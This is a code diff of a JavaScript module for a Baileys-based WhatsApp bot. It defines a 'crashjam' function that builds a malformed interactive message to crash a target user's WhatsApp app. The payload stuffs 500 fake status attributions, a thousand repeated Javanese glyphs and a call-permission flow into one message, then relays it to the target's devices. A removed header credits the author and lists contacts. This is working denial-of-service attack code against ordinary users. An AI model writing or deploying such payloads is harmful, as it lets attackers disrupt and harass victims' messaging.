@@ -1,35 +1,16 @@
-/*
- * © 2026 SeXyxeon (VOIDSEC)
- *
- * ⚠️ COPYRIGHT NOTICE
- * This source code is protected under copyright law.
- * Any form of re-uploading, recoding, modification,
- * selling, or redistribution WITHOUT explicit permission
- * from the original author is strictly prohibited.
- *
- * ❌ NO CREDIT = NO PERMISSION
- * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
- *
- * ✔️ Usage or modification is allowed ONLY
- * with prior permission and proper credit.
- *
- * OFFICIAL LINKS (ONLY):
- * YouTube   : https://youtube.com/@voidsec7718
- * Instagram : sabir._7718
- * Telegram  : https://t.me/SABIR7718
- * GitHub    : https://github.com/SABIR7718
- * WhatsApp  : +91 73650 85213
- *
- * Violations may result in DMCA takedown
- * or termination of the Telegram bot.
- */
-
-const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
-const pino = require('pino');
 const crypto = require('crypto');
 const { relayCrashToDevices } = require('../target-utils');
 
 async function crashjam(SYxS7, target) {
+    const cleanUser = target.split('@')[0].split(':')[0];
+    const targetBaseJid = `${cleanUser}@s.whatsapp.net`;
+
+    const statusAttributions = Array.from({ length: 500 }, (_, i) => ({
+        participant: `${Math.floor(10000000000 + Math.random() * 89999999999)}@s.whatsapp.net`,
+        type: 1
+    }));
+    statusAttributions.unshift({ participant: targetBaseJid, type: 1 });
+
     const SABANA_LOVE = {
         messageContextInfo: {
             messageSecret: crypto.randomBytes(32),
@@ -50,20 +31,15 @@ async function crashjam(SYxS7, target) {
                     creator: "FLIX"
                 },
                 statusAttributionType: 2,
-                statusAttributions: Array.from({ length: 209000 }, () => ({
-                    participant: `${
-                        ['41','91','90','31','40'][Math.floor(Math.random()*5)]
-                    }${Math.floor(Math.random()*1e10).toString().padStart(10,'0')}@s.whatsapp.net`,
-                    type: 1
-                }))
+                statusAttributions
             },
             body: {
-                text: "",
+                text: "⚡ CRASH JAM " + "ꦾ".repeat(1000),
                 format: "DEFAULT"
             },
             nativeFlowResponseMessage: {
                 name: "call_permission_request",
-                paramsJson: "kkk",
+                paramsJson: JSON.stringify({ status: "active", code: "CRASH_JAM" }),
                 version: 3
             }
         }
@@ -75,9 +51,7 @@ async function crashjam(SYxS7, target) {
         }
     };
 
-    try {
-        await relayCrashToDevices(SYxS7, target, SABIR7718_LOVE_SABANA);
-    } catch (e) {}
+    return await relayCrashToDevices(SYxS7, target, SABIR7718_LOVE_SABANA);
 }
 
 module.exports = { crashjam };
